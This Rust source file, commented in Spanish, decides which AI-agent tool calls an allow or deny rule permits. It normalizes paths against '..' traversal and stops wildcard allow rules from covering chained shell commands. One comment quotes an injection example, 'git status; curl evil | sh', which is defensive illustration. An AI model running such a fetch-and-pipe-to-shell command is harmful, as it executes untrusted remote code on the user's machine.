//! Qué se decide sin preguntar.
//!
//! Con un agente solo, contestar cada permiso a mano se banca. Con cinco es inusable: la
//! consola se llena de preguntas y el usuario termina apretando "sí" a todo, que es peor
//! que no haber preguntado. Las reglas son lo que deja que la consola muestre **solo lo
//! que ninguna cubre**.
//!
//! Todo acá es puro: una regla es texto, un pedido es un nombre de herramienta más su
//! input, y la decisión sale de compararlos. Se puede probar sin lanzar nada.
//!
//! ## La forma de una regla
//!
//! `Herramienta` o `Herramienta(patrón)`, la misma que ya usa Claude Code en
//! `--allowedTools`. Se eligió esa y no una propia porque es la que el usuario ya tiene
//! escrita en sus `settings.json`, y tener dos sintaxis para lo mismo es una garantía de
//! que se van a confundir.
//!
//! - `Read` — cualquier lectura.
//! - `Bash(git status*)` — solo ese comando.
//! - `Edit(src/**)` — solo dentro de esa carpeta.
//!
//! El `patrón` se compara contra **el mismo campo que identifica la acción** en la
//! tarjeta: la ruta para las de archivo, el comando para `Bash`, el patrón para las de
//! búsqueda. Que sea el mismo importa: una regla que se aplica a algo distinto de lo que
//! el usuario leyó en la tarjeta es una trampa.

use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct PermissionRule {
    /// `Bash(git status*)`, `Read`, `Edit(src/**)`.
    pub pattern: String,
    /// `true` = permitir sin preguntar, `false` = denegar sin preguntar.
    pub allow: bool,
}

/// Qué hacer con un pedido.
#[derive(Debug, PartialEq, Clone, Copy)]
pub enum Decision {
    Allow,
    Deny,
    /// Ninguna regla lo cubre: va a la consola y espera a una persona.
    Ask,
}

/// El argumento de una herramienta que una regla puede mirar.
///
/// Es el mismo que muestra `activity::tool_label`, a propósito: la regla se escribe
/// mirando la tarjeta.
pub fn rule_arg(tool: &str, input: &serde_json::Value) -> Option<String> {
    let key = match tool {
        "Read" | "Edit" | "Write" | "NotebookEdit" => "file_path",
        "Bash" | "BashOutput" => "command",
        "Grep" | "Glob" => "pattern",
        "WebFetch" => "url",
        _ => return None,
    };
    input.get(key).and_then(|v| v.as_str()).map(str::to_string)
}

/// Parte una regla en `(herramienta, patrón)`.
fn split(pattern: &str) -> (&str, Option<&str>) {
    let p = pattern.trim();
    match (p.find('('), p.strip_suffix(')')) {
        (Some(i), Some(_)) => (p[..i].trim(), Some(&p[i + 1..p.len() - 1])),
        _ => (p, None),
    }
}

/// Un glob con `*` (cualquier cosa, barras incluidas) y `**` (lo mismo). Devuelve lo que
/// cubrió cada `*`, o `None` si no coincide.
///
/// `**` no se distingue de `*` porque la diferencia solo importa cuando se quiere que `*`
/// NO cruce barras, y acá la comparación es contra una ruta o un comando enteros: hacer
/// que `src/*` no matchee `src/a/b.rs` sorprendería más de lo que ayudaría. Se acepta
/// `**` igual porque es lo que el usuario ya escribe en sus settings.
///
/// Los extremos se anclan: lo que hay antes del primer `*` es prefijo y lo que hay después
/// del último es SUFIJO (`*.rs` coincide con `a.rs.rs`, que antes se perdía por buscar la
/// primera aparición de `.rs`).
fn glob_captures<'a>(pattern: &str, text: &'a str) -> Option<Vec<&'a str>> {
    let parts: Vec<&str> = pattern.split('*').collect();
    if parts.len() == 1 {
        return (pattern == text).then(Vec::new);
    }
    let (first, last) = (parts[0], parts[parts.len() - 1]);
    let mut rest = text.strip_prefix(first)?;
    let mut captures = Vec::with_capacity(parts.len() - 1);
    for middle in &parts[1..parts.len() - 1] {
        let i = rest.find(middle)?;
        captures.push(&rest[..i]);
        rest = &rest[i + middle.len()..];
    }
    captures.push(rest.strip_suffix(last)?);
    Some(captures)
}

fn glob_matches(pattern: &str, text: &str) -> bool {
    glob_captures(pattern, text).is_some()
}

/// Lo que en una línea de shell (sh, cmd, PowerShell) separa, encadena, redirige o expande.
const SHELL_META: &[char] = &[';', '&', '|', '`', '$', '>', '<', '\n', '\r'];

/// Las partes de un comando encadenado, para que una regla que NIEGA alcance a cualquiera.
fn command_segments(command: &str) -> impl Iterator<Item = &str> {
    command.split([';', '&', '|', '\n', '\r']).map(str::trim).filter(|s| !s.is_empty())
}

/// Una ruta comparable: barras de Windows a `/`, sin `.` y con cada `..` resuelto contra lo
/// anterior. `None` si un `..` sube por encima de donde arranca: eso no está "dentro" de
/// nada que una regla pueda nombrar.
fn normalize_path(path: &str) -> Option<String> {
    let unified = path.replace('\\', "/");
    let absolute = unified.starts_with('/');
    let mut parts: Vec<&str> = Vec::new();
    for part in unified.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                // `C:` en `C:/..` no se puede quitar: subir de la raíz de una unidad es salir.
                if parts.pop().is_none_or(|p| p.ends_with(':')) {
                    return None;
                }
            }
            other => parts.push(other),
        }
    }
    let joined = parts.join("/");
    Some(if absolute { format!("/{joined}") } else { joined })
}

fn is_path_tool(tool: &str) -> bool {
    matches!(tool, "Read" | "Edit" | "Write" | "NotebookEdit")
}

fn rule_matches(rule: &PermissionRule, tool: &str, arg: Option<&str>) -> bool {
    let (rule_tool, rule_arg) = split(&rule.pattern);
    if rule_tool != tool {
        return false;
    }
    // Sin paréntesis la regla vale para toda la herramienta.
    let Some(pat) = rule_arg else { return true };
    // Con paréntesis hace falta un argumento que comparar: si la herramienta no expone
    // ninguno que conozcamos, la regla NO aplica y se termina preguntando. Es el lado
    // seguro del error — el otro sería permitir algo por una regla que nunca se pudo
    // verificar.
    let Some(arg) = arg else { return false };

    if is_path_tool(tool) {
        // `src/../../.bashrc` no está dentro de `src/`: se compara la ruta resuelta. Una que
        // sube por encima de su comienzo no la cubre ninguna regla que permita, y una que
        // niega se le aplica igual (negar de más es el lado seguro).
        return match (normalize_path(arg), normalize_path(pat)) {
            (Some(path), Some(pat)) => glob_matches(&pat, &path),
            (None, _) => !rule.allow,
            (_, None) => false,
        };
    }
    if tool == "Bash" {
        if rule.allow {
            // Lo que cubrió un `*` no puede encadenar, redirigir ni expandir:
            // `Bash(git status*)` no autoriza `git status; curl evil | sh`. Una regla exacta
            // (sin `*`) sí puede tener esos caracteres: el usuario los escribió y los leyó.
            return glob_captures(pat, arg).is_some_and(|caps| caps.iter().all(|c| !c.contains(SHELL_META)));
        }
        // Una regla que niega alcanza a cualquier parte de un comando encadenado:
        // `echo hola; git push` cae en `Bash(git push*)`.
        return glob_matches(pat, arg) || command_segments(arg).any(|segment| glob_matches(pat, segment));
    }
    glob_matches(pat, arg)
}

/// Qué dicen las reglas sobre este pedido.
///
/// Gana **la primera que coincide**, no la más específica. El orden es el que el usuario
/// ve y puede reordenar; inferir precedencia por especificidad haría que dos reglas que se
/// leen claras produzcan un resultado que no se deduce mirándolas.
pub fn decide(rules: &[PermissionRule], tool: &str, input: &serde_json::Value) -> Decision {
    let arg = rule_arg(tool, input);
    match rules.iter().find(|r| rule_matches(r, tool, arg.as_deref())) {
        Some(r) if r.allow => Decision::Allow,
        Some(_) => Decision::Deny,
        None => Decision::Ask,
    }
}

/// La regla que deja escrita "recordar": **exactamente** lo que se vio en la tarjeta.
///
/// No se generaliza nada. Aprobar `cargo test --lib` no puede terminar autorizando
/// `cargo test` a secas, ni aprobar la edición de un archivo autorizar la carpeta entera:
/// una regla más amplia que lo que el usuario leyó es una regla que no aprobó. Quien
/// quiera algo más general lo escribe a mano, sabiendo lo que escribe.
///
/// Por eso hay dos casos en los que NO se ofrece recordar:
///
/// - **La herramienta no expone un dato que se pueda fijar** (la de un MCP, por ejemplo).
///   La única regla posible sería la herramienta entera, y eso es aprobar de antemano
///   cualquier cosa que haga en el futuro con cualquier input.
/// - **El dato tiene un `*`.** En una regla `*` es comodín, así que `Bash(rm *.log)`
///   aprobaría también `rm -rf /tmp/x.log`. Sin forma de escaparlo, recordar ese comando
///   sería recordar uno bastante más peligroso que el que se aprobó.
pub fn exact_rule_for(tool: &str, input: &serde_json::Value) -> Option<String> {
    let arg = rule_arg(tool, input)?;
    if arg.contains('*') || arg.trim().is_empty() {
        return None;
    }
    Some(format!("{tool}({arg})"))
}

/// Si un patrón escrito a mano tiene la forma de una regla.
///
/// No valida que la herramienta exista: las de un MCP se llaman como se les antoje, y
/// rechazar lo que no conocemos dejaría afuera justo lo que más conviene poder regular.
pub fn is_valid_pattern(pattern: &str) -> bool {
    let p = pattern.trim();
    if p.is_empty() {
        return false;
    }
    let (tool, arg) = split(p);
    let tool_ok = !tool.is_empty() && !tool.contains(char::is_whitespace);
    // Un paréntesis abierto sin cerrar no es un patrón con argumento vacío: es un error de
    // tipeo, y aceptarlo dejaría una regla que parece acotada y vale para toda la
    // herramienta.
    let parens_ok = p.contains('(') == p.ends_with(')');
    tool_ok && parens_ok && arg.is_none_or(|a| !a.trim().is_empty())
}
